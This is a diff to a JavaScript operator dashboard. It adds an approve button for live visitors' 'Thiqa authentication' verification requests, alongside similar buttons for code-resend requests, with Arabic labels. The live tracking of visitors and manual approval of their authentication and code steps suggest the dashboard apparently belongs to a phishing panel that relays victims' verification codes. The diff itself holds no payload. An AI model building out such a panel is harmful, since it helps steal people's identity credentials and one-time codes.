@@ -2082,6 +2082,31 @@
               }, 100);
             }
             
+            // إضافة زر موافقة لطلب مصادقة ثقة
+            if (dataEntry.page === 'مصادقة ثقة' && dataEntry.content && dataEntry.content['طلب'] === 'تحقق ثقة جديد') {
+              const thiqaApproveBtnId = 'thiqa-approve-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + thiqaApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium cursor-pointer"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const btn = document.getElementById(thiqaApproveBtnId);
+                if (btn) {
+                  btn.addEventListener('click', () => {
+                    visitor.waitingForAdminResponse = false;
+                    renderVisitorsList();
+                    btn.textContent = 'تم الإرسال ✓';
+                    btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    btn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      btn.textContent = 'موافقة';
+                      btn.classList.remove('bg-gray-500');
+                      btn.classList.add('bg-green-600', 'hover:bg-green-700');
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
             // إضافة زر موافقة لطلب إعادة إرسال الرمز
             if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
               html += '<div class="flex gap-2 mt-3">';
